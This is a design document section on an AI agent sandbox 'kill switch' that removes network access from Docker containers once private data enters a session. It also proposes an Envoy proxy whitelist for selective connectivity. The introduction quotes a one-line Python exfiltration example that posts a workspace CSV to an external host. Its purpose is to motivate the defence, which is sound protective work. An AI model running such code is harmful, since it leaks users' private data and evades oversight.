## Kill switch

When an agent executes arbitrary code inside a sandbox, the tool permission system cannot enforce boundaries. The `@tool_permission` decorator with `CONNECT` checks whether the agent is *allowed* to call a tool, but it has no authority over what happens inside a Docker container where the agent runs Python, shell commands, or any other language. A one-liner `requests.post("https://external.com", data=open("/workspace/data.csv").read())` bypasses every permission check because it never goes through the tool-calling path. The sandbox section describes how `network_mode="none"` addresses this by removing the container's network stack entirely when private data enters the session. This section steps back and examines the broader design: the binary switch implemented in our POC, and a more sophisticated proxy-based approach for scenarios that require selective connectivity.

### The binary switch (implemented)

The kill switch in our POC is a binary choice: full network access or no network access at all. Docker's `network_mode="none"` strips every network interface from the container except loopback. No DNS resolution, no TCP connections, no UDP traffic. The container becomes a compute island that can read and write files on its mounted workspace but cannot reach anything beyond `127.0.0.1`.

The `PrivateData` compliance module drives this switch. When a connector retrieves sensitive records -- patient data from a database, financial reports from an internal API -- it calls `PrivateData.add_private_dataset()` to register the dataset and its sensitivity level. The sandbox manager checks this state on every session access. If the session has private data and the container still has full network access, the manager stops the container and creates a new one with `network_mode="none"`, mounting the same workspace directory so files survive the transition.

```python
class NetworkMode(str, Enum):
    FULL = "bridge"
    NONE = "none"

def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
    if session_has_private_data(user_id, session_id):
        return NetworkMode.NONE
    return NetworkMode.FULL
```

This transition is a one-way ratchet. Once private data enters the session, network access never returns. The sensitivity level can escalate (from INTERNAL to CONFIDENTIAL to SECRET) but never decrease, and the network stays off for the remainder of the session's lifetime. This mirrors the real-world principle that you cannot "un-see" data -- once an agent has processed confidential records, any subsequent code it generates could embed fragments of that data in network requests.

The binary switch works well for sessions where the data sensitivity is clear-cut. A session analyzing anonymized public datasets runs with full network access. A session processing patient records runs with no network at all. The decision is simple, auditable, and impossible to circumvent from inside the container.

### Dynamic switching

The sandbox manager checks `get_network_mode()` on every `get_or_create_session()` call and compares the result against the container's current network mode. If the required mode is more restrictive than the current mode, the manager stops the container and creates a new one with the correct network configuration, reattaching the workspace volume.

The container recreation is transparent to the agent. The workspace directory is a bind mount that survives container lifecycle changes. The agent may notice a brief pause while the new container starts, but all files, intermediate results, and generated code remain in place. From the agent's perspective, the only observable change is that network destinations that were previously reachable now return connection errors.

For a better user experience, the system can inject a message into the agent's context when the network mode changes:

```
[SYSTEM] Network access has been restricted because private data
entered this session. Outbound connections are blocked.
```

The agent can then decide to work with the data locally, or ask the user for guidance -- rather than wasting turns on requests that will never succeed.

### Relationship to tool permissions

The kill switch and the tool permission system are independent enforcement layers that protect against different vectors. Tool permissions prevent the agent from calling tools it should not use -- for example, blocking a `CONNECT`-tagged tool when private data is present. The kill switch prevents code inside the sandbox from making network connections that bypass the tool system entirely.

Neither layer depends on the other. An agent session with private data has both protections active simultaneously: tool permissions block the tool-calling path, and the kill switch blocks the code-execution path. This defense-in-depth means that a failure or misconfiguration in one layer does not expose the data through the other.

```
Agent
  |
  |-- Tool call path
  |     @tool_permission(CONNECT) blocks exfiltration tools
  |
  |-- Code execution path (sandbox)
        Kill switch blocks network at infrastructure level
```

Together with the `PrivateData` compliance module that drives both layers, the system provides a coherent data protection pipeline: connectors tag data as it enters the session, tool permissions restrict the agent's tool vocabulary, and the kill switch restricts the sandbox's network reach. Each layer operates at a different level of the stack, and all three activate automatically from the same trigger.

### Beyond binary: proxy-based selective connectivity

The limitation of the binary switch becomes apparent in mixed workflows. An enterprise agent often needs to combine private data with external services that are themselves trusted: an internal company API, a data warehouse behind the VPN, a cloud service with a Zero Data Retention (ZDR) agreement. Cutting all network access forces the agent to stop mid-task whenever it needs to reach one of these services after private data has entered the session.

A more sophisticated approach places a proxy (such as Envoy) between the container and the network. The proxy holds a whitelist of allowed destinations. Requests to whitelisted URLs pass through; everything else is rejected. The container itself has network access, but only through the proxy, and the proxy enforces which destinations are reachable.

The architecture uses two Docker networks. The first is an internal network with no external route, connecting only the sandbox container and the proxy. The second is the default bridge network that gives the proxy access to the outside world. The sandbox container cannot reach the internet directly because its only network has no gateway. It can only reach the proxy, and the proxy decides what traffic to forward.

```
                  internal network              bridge network
                  (no gateway)                  (internet access)

 +-------------+                 +-------+                    +-----------+
 |  Sandbox    | --- HTTP(S) --> | Envoy | --- HTTP(S) -->    | Trusted   |
 |  Container  |                 | Proxy |                    | Services  |
 +-------------+                 +-------+                    +-----------+
                                     |
                                     X--- blocked -->  Untrusted destinations
```

The whitelist is not per-session. It is a platform-level configuration that defines which external services the organization trusts enough to receive data from agent sessions. Typical entries include internal APIs, data warehouses, cloud services with ZDR contracts, and monitoring endpoints. The list is maintained by the platform team, not by the agent or the user.

With this proxy in place, the `NetworkMode` enum could gain a third option:

```python
class NetworkMode(str, Enum):
    FULL = "bridge"
    PROXIED = "proxied"   # whitelist-only via proxy
    NONE = "none"
```

The mode selection would then consider the sensitivity level: PUBLIC and INTERNAL data get full access, CONFIDENTIAL data triggers proxied mode, and SECRET data triggers the full kill switch. The ratchet behavior still applies -- sensitivity can escalate but never decrease.

This proxy-based approach is not implemented in our POC. The binary FULL/NONE switch covers the most common scenarios and is simple to deploy and audit. The proxy pattern is presented here as a design direction for production deployments where blanket network removal is too restrictive for the organization's workflows.
